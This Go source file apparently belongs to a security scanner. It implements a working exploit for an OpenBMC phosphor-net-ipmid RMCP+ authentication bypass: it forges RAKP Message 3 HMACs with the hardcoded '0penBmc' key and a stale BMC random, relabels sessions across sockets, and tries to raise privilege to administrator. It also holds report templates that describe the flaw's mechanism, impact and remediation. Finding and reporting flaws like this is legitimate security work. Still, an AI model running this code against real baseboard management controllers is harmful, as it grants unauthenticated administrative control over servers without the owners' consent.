	r2, err := ipmi.SendRAKP1ToSession(cC, bmcSID, crossRand, "root", 0x14)
	if err != nil {
		bp.CrossRAKP1Error = err.Error()
		return bp
	}
	bp.CrossRAKP1Status = r2.ErrorCode
	bp.CrossRAKP1StatusName = rakpStatusName(r2.ErrorCode)
	if r2.ErrorCode != 0x00 {
		bp.CrossRAKP1Error = fmt.Sprintf("rakp2 status=0x%02x", r2.ErrorCode)
		return bp
	}

	// Extract the new bmc-random from RAKP2 (payload bytes 8-23).
	var newBMCRand []byte
	if raw := r2.RAKP2Raw; len(raw) > 0 {
		if payload, perr := ipmi.RmcpPlusPayload(raw); perr == nil && len(payload) >= 24 {
			newBMCRand = make([]byte, 16)
			copy(newBMCRand, payload[8:24])
			bp.CrossBMCRand = append([]byte(nil), newBMCRand...)
		}
	}

	// Attempt RAKP3 from cC using the new bmcRandom and the default userKey.
	// HMAC input: newBMCRand(16) || rcSessionID(4) || sessPrivLevel(1) || userLen(1) || "root"
	//
	// After the cross-socket RAKP1 with role=0x14, session->reqMaxPrivLevel is
	// updated to 0x14 (the raw byte from RAKP1 req_max_privilege_level). The
	// RAKP3 verify uses this value, so we must match it here.
	const crossSocketRole byte = 0x14
	if len(newBMCRand) == 16 {
		var hmacInput []byte
		hmacInput = append(hmacInput, newBMCRand...)
		hmacInput = binary.LittleEndian.AppendUint32(hmacInput, cSID)
		hmacInput = append(hmacInput, crossSocketRole)
		hmacInput = append(hmacInput, byte(len("root")))
		hmacInput = append(hmacInput, []byte("root")...)

		mac := hmac.New(rakpHashForAlgo(suite.Auth), openbmcDefaultUserKey)
		mac.Write(hmacInput)
		kec := mac.Sum(nil)

		var r3 []byte
		r3 = append(r3, 0x00, 0x00, 0x00, 0x00)
		r3 = binary.LittleEndian.AppendUint32(r3, bmcSID)
		r3 = append(r3, kec...)
		r4Resp, r3err := cC.Send(ipmi.BuildRMCPPlus(ipmi.PayloadRAKP3, r3))
		if r3err == nil {
			if r4Payload, perr := ipmi.RmcpPlusPayload(r4Resp); perr == nil && len(r4Payload) >= 2 {
				bp.CrossRAKP3Status = r4Payload[1]
				bp.CrossRAKP3StatusName = rakpStatusName(r4Payload[1])
			}
		}
	}

	// Commands from a short-timeout cBshort (original session side, after relabel).
	cBshort2, err := ipmi.NewClient(host, port, probeTimeout)
	if err == nil {
		defer cBshort2.Close()
		seq := byte(20)
		cc, data, _ := ipmi.ExecClearIPMI(cBshort2, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x00}, seq)
		seq++
		bp.CrossBPrivQueryCC = cc
		bp.CrossBPrivQueryData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort2, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x04}, seq)
		seq++
		bp.CrossBSetPrivAdminCC = cc
		bp.CrossBSetPrivAdminData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort2, bmcSID, ipmi.NetFnApp, ipmi.CmdGetPayloadStatus, []byte{0x01}, seq)
		seq++
		bp.CrossBSOLStatusCC = cc
		bp.CrossBSOLStatusData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cBshort2, bmcSID, ipmi.NetFnApp, ipmi.CmdGetDeviceID, nil, seq)
		bp.CrossBGetDeviceIDCC = cc
		bp.CrossBGetDeviceIDData = append([]byte(nil), data...)
	}

	// Commands from cC (the relabelling connection) using a short timeout.
	cCshort, err := ipmi.NewClient(host, port, probeTimeout)
	if err == nil {
		defer cCshort.Close()
		seq := byte(30)
		cc, data, _ := ipmi.ExecClearIPMI(cCshort, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x00}, seq)
		seq++
		bp.CrossCPrivQueryCC = cc
		bp.CrossCPrivQueryData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cCshort, bmcSID, ipmi.NetFnApp, ipmi.CmdSetSessionPrivilege, []byte{0x04}, seq)
		seq++
		bp.CrossCSetPrivAdminCC = cc
		bp.CrossCSetPrivAdminData = append([]byte(nil), data...)

		cc, data, _ = ipmi.ExecClearIPMI(cCshort, bmcSID, ipmi.NetFnApp, ipmi.CmdGetDeviceID, nil, seq)
		bp.CrossCGetDeviceIDCC = cc
		bp.CrossCGetDeviceIDData = append([]byte(nil), data...)
	}

	bp.CrossCommandsWork = bp.CrossBPrivQueryCC == 0x00 ||
		bp.CrossBSetPrivAdminCC == 0x00 ||
		bp.CrossBSOLStatusCC == 0x00 ||
		bp.CrossBGetDeviceIDCC == 0x00 ||
		bp.CrossCPrivQueryCC == 0x00 ||
		bp.CrossCSetPrivAdminCC == 0x00 ||
		bp.CrossCGetDeviceIDCC == 0x00

	return bp
}

// buildOpenSessionBodyDefaultKey builds an Open Session Request body with the
// given client SID and cipher suite, requesting the specified max privilege.
func buildOpenSessionBodyDefaultKey(clientSID uint32, suite ipmi.CipherAlgos, reqPriv byte) []byte {
	var b []byte
	b = append(b, 0x00)         // message tag
	b = append(b, reqPriv&0x0f) // requested max privilege
	b = append(b, 0x00, 0x00)   // reserved
	b = binary.LittleEndian.AppendUint32(b, clientSID)
	// Auth payload: type=0x00, reserved(2), len=8, algo+padding(4)
	b = append(b, 0x00, 0x00, 0x00, 0x08)
	b = append(b, suite.Auth, 0x00, 0x00, 0x00)
	// Integrity payload: type=0x01, reserved(2), len=8, algo+padding(4)
	b = append(b, 0x01, 0x00, 0x00, 0x08)
	b = append(b, suite.Integrity, 0x00, 0x00, 0x00)
	// Confidentiality payload: type=0x02, reserved(2), len=8, algo+padding(4)
	b = append(b, 0x02, 0x00, 0x00, 0x08)
	b = append(b, suite.Conf, 0x00, 0x00, 0x00)
	return b
}

// buildRAKP1DefaultKey builds a RAKP1 message body.
func buildRAKP1DefaultKey(bmcSID uint32, clientRand []byte, username string, reqPriv byte) []byte {
	var b []byte
	b = append(b, 0x00)             // message tag
	b = append(b, 0x00, 0x00, 0x00) // reserved
	b = binary.LittleEndian.AppendUint32(b, bmcSID)
	b = append(b, clientRand...) // 16 bytes
	b = append(b, reqPriv&0x0f)  // requested max privilege level
	b = append(b, 0x00, 0x00)    // reserved
	b = append(b, byte(len(username)))
	b = append(b, []byte(username)...)
	return b
}

// rakpStatusName returns a human-readable name for a RAKP status code.
func rakpStatusName(code byte) string {
	switch code {
	case 0x00:
		return "no errors"
	case 0x01:
		return "insufficient resources"
	case 0x02:
		return "invalid session id"
	case 0x03:
		return "invalid payload type"
	case 0x04:
		return "invalid authentication algorithm"
	case 0x05:
		return "invalid integrity algorithm"
	case 0x06:
		return "no matching authentication payload"
	case 0x07:
		return "no matching integrity payload"
	case 0x08:
		return "inactive session id"
	case 0x09:
		return "inactive role"
	case 0x0a:
		return "unauthorized role or privilege"
	case 0x0b:
		return "insufficient resources for role"
	case 0x0c:
		return "invalid username length"
	case 0x0d:
		return "unauthorized username"
	case 0x0e:
		return "unauthorized guid"
	case 0x0f:
		return "invalid integrity check"
	case 0x10:
		return "invalid confidentiality algorithm"
	case 0x11:
		return "no matching confidentiality payload"
	case 0x12:
		return "illegal parameter"
	default:
		return fmt.Sprintf("status 0x%02x", code)
	}
}

// explainDefaultUserKeyBacktick is the sentinel used for markdown code spans in
// the explain templates below. Go raw-string literals cannot contain a backtick,
// so the templates use this marker and it is swapped for a real backtick after
// substitution. It never appears in the substituted field values.
const explainDefaultUserKeyBacktick = "~"

// explainDefaultUserKeyConfirmedTmpl renders a confirmed bypass. Placeholder
// order: host, bmcSid, suite, rakp1Status, rakp1StatusName, usernameUsed,
// bmcRandom, bmcRandomHeapPtr, rakp3Status, rakp3StatusName.
const explainDefaultUserKeyConfirmedTmpl = `## OpenBMC default userKey authentication bypass

- Host: %s
- Risk: High - unauthenticated, passwordless RMCP+ session activation

### Summary

An unauthenticated client can activate an RMCP+ session on this host with no
account password. ~phosphor-net-ipmid~ initializes each RAKP authentication
object's 20-byte ~userKey~ from the constant string ~0penBmc~ and leaves
~bmcRandomNum~ uninitialized. A RAKP Message 1 that requests CALLBACK privilege
trips the ~UNAUTH_ROLE_PRIV~ early return in ~RAKP12()~ before the configured
account password and a fresh BMC random are copied into the object, so ~userKey~
stays the constant value and ~bmcRandomNum~ stays stale. ~RAKP34()~ then accepts
a RAKP Message 3 whose HMAC is computed from that constant key and the stale
~bmcRandomNum~, installs integrity and confidentiality keys the attacker also
knows, and moves the session to ~active~.

### Mechanism

1. ~Open Session~ with ~maxPrivLevel = ADMIN~: the BMC session's
   ~reqMaxPrivLevel~ becomes ADMIN and the auth object's ~userKey~ is the
   constructor default ~0penBmc~.
2. ~RAKP Message 1~ requesting CALLBACK privilege: trips ~UNAUTH_ROLE_PRIV~ in
   ~RAKP12()~. The remote-console random is stored, but the early ~return~ skips
   both the account-password copy over ~userKey~ and the copy of the fresh BMC
   random into ~bmcRandomNum~.
3. ~RAKP Message 3~ with an HMAC over the stale ~bmcRandomNum~, keyed by the
   constant ~userKey~. ~RAKP34()~ never checks that RAKP Message 1 succeeded,
   recomputes the same HMAC, and activates the session.

### Evidence

| Step | Field | Value |
|---|---|---|
| Open Session | BMC session ID | %s |
| Open Session | Cipher suite | %s |
| RAKP Message 1 | Status | %s (%s) |
| RAKP Message 1 | Username | %s |
| RAKP Message 1 | Requested privilege | CALLBACK (trips the early return) |
| RAKP Message 3 | HMAC key | 0penBmc (20-byte hardcoded default userKey) |
| RAKP Message 3 | Stale bmcRandomNum | %s (heap pointer %s) |
| RAKP Message 4 | Status | %s (%s) |

### Impact

The activated session carries integrity and encryption keys the attacker
computed, is attributed to the requested username in audit logs, and needs no
valid password. It is limited to CALLBACK privilege because the early return
skips the account and channel privilege initialization, but it is a foothold
with known keys: resending a sessionless RAKP Message 1 that names an enabled
administrator (the active-session relabel, ~ipmi.openbmc.rakp1ActiveRelabel~)
raises it to administrator and permits provider-backed IPMI commands.

Changing the account password does not remediate this. ~userKey~ is a member
initializer applied to every new auth object at construction; the configured
password is only copied over it later in ~RAKP12()~, after the privilege check
the attacker deliberately trips. The bypass therefore always uses the constant
~0penBmc~ key regardless of the configured password, confirmed live after a
password change and a daemon restart. This is a code defect, not a default- or
weak-credential exposure, so password rotation cannot mitigate it.

### Remediation

1. Remove the hardcoded ~userKey = {"0penBmc"}~ initializer from ~auth_algo.hpp~
   and fail closed if the key was never set before any HMAC is generated.
2. Generate ~bmcRandomNum~ directly into the auth object before any validation
   branch so it is never stale.
3. Reject RAKP Message 3 in ~RAKP34()~ unless RAKP Message 1 completed on a
   pending setup object in the expected state.
4. Clear the auth object's ~userKey~, random numbers, and identity on any
   ~RAKP12()~ early exit.

### References

- CWE-798 (Use of Hard-coded Credentials): https://cwe.mitre.org/data/definitions/798.html
- CWE-457 (Use of Uninitialized Variable): https://cwe.mitre.org/data/definitions/457.html
- OpenBMC phosphor-net-ipmid: https://github.com/openbmc/phosphor-net-ipmid
`

// explainDefaultUserKeyPreconditionTmpl renders when only the RAKP1 early-exit
// precondition was observed. Placeholder order: host, rakp1Status,
// rakp1StatusName, attempts.
const explainDefaultUserKeyPreconditionTmpl = `## OpenBMC default userKey authentication bypass - precondition only

- Host: %s
- Risk: Medium - precondition observed, bypass not confirmed

### Summary

The RAKP Message 1 early-exit precondition was observed (status %s / %s): a
CALLBACK-privilege RAKP Message 1 returns ~UNAUTH_ROLE_PRIV~ before the account
password and BMC random are written into the auth object, so ~userKey~ stays the
constant ~0penBmc~ value and ~bmcRandomNum~ stays stale. No RAKP Message 3 was
accepted across %s attempts, so passwordless activation was not confirmed on
this run.

Confirmation depends on reproducing the stale ~bmcRandomNum~ for this process: it
is drawn from a freed heap chunk and changes when ~netipmid~ restarts. With shell
access, sample the live value and re-supply it via
~--ipmi-openbmc-userkey-bmcrand~; otherwise narrow the sweep range
(~--ipmi-openbmc-userkey-heap-start~ / ~-heap-end~) or set the build's stable
in-page offset (~--ipmi-openbmc-userkey-page-offset~) and retry.
`

// explainDefaultUserKeyPatchLeadTmpl renders the default, bounded patch-status
// result. Placeholder order: host, rakp1Status, rakp1StatusName, rakp3Status,
// rakp3StatusName, fullTestOption.
const explainDefaultUserKeyPatchLeadTmpl = `## OpenBMC default userKey authentication bypass - likely unpatched

- Host: %s
- Risk: Medium - patch-absence indicator; bypass not yet confirmed

### Summary

The server returned RAKP Message 2 status %s (%s) for the deliberate CALLBACK
privilege failure, then processed the out-of-state RAKP Message 3 through its
HMAC comparison and returned RAKP Message 4 status %s (%s). Reaching the
integrity comparison after RAKP Message 1 failed is the behavior of the
unpatched state machine; patched implementations reject RAKP Message 3 before
this comparison.

This bounded default probe used only the all-zero stale-random candidate, so it
does not confirm passwordless activation. Run the full candidate search with
~%s~ to confirm exploitability and recover a working stale ~bmcRandomNum~.
`

func explainOpenBMCDefaultUserKeyBypass(host string, f engine.Finding) string {
	fields := make(map[string]string, len(f.Fields))
	for _, fld := range f.Fields {
		fields[fld.Key] = fld.Val
	}
	get := func(k string) string {
		if v, ok := fields[k]; ok && v != "" {
			return v
		}
		return "-"
	}
	var out string
	if strings.EqualFold(fields["authBypassed"], "true") {
		out = fmt.Sprintf(explainDefaultUserKeyConfirmedTmpl,
			host, get("bmcSid"), get("suite"),
			get("rakp1Status"), get("rakp1StatusName"),
			get("usernameUsed"),
			get("bmcRandom"), get("bmcRandomHeapPtr"),
			get("rakp3Status"), get("rakp3StatusName"))
	} else if strings.EqualFold(fields["patchStatus"], "likely-unpatched") {
		out = fmt.Sprintf(explainDefaultUserKeyPatchLeadTmpl,
			host, get("rakp1Status"), get("rakp1StatusName"),
			get("rakp3Status"), get("rakp3StatusName"), get("fullTestOption"))
	} else {
		out = fmt.Sprintf(explainDefaultUserKeyPreconditionTmpl,
			host, get("rakp1Status"), get("rakp1StatusName"), get("attempts"))
	}
	return strings.ReplaceAll(out, explainDefaultUserKeyBacktick, "`")
}
